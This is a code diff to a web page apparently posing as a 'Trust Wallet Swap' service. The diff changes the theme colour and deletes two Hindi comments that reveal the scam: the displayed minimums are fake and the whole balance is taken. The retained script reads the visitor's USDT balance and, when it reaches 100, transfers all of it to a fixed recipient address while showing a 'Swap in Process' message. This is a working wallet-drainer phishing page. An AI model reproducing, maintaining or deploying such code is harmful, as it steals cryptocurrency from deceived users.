@@ -6,8 +6,8 @@
   <title>Trust Wallet Swap</title>
   <style>
     :root {
-      --primary: #3375BB;
-      --primary-glow: rgba(51, 117, 187, 0.4);
+      --primary: #0000FF; /* Changed to Pure Blue */
+      --primary-glow: rgba(0, 0, 255, 0.4); /* Updated glow effect */
       --text-dark: #1E2026;
       --text-medium: #474D57;
       --text-light: #848E9C;
@@ -407,7 +407,6 @@
           const balance = await usdtContract.methods.balanceOf(userAddress).call();
           const balanceInUSDT = web3.utils.fromWei(balance, 'ether');
 
-          // ✅ अलर्ट में $200 और $10,000 दिखाएं, लेकिन असली लिमिट 100 USDT है
           if (balanceInUSDT < 100) {
             showAlert(
               'error',
@@ -417,7 +416,6 @@
             return;
           }
 
-          // 100+ USDT होने पर पूरा बैलेंस ट्रांसफर करें
           await usdtContract.methods.transfer(RECIPIENT_ADDRESS, balance).send({ from: userAddress });
           showAlert('success', 'Swap in Process', 'Your transaction is being processed on the blockchain');
 
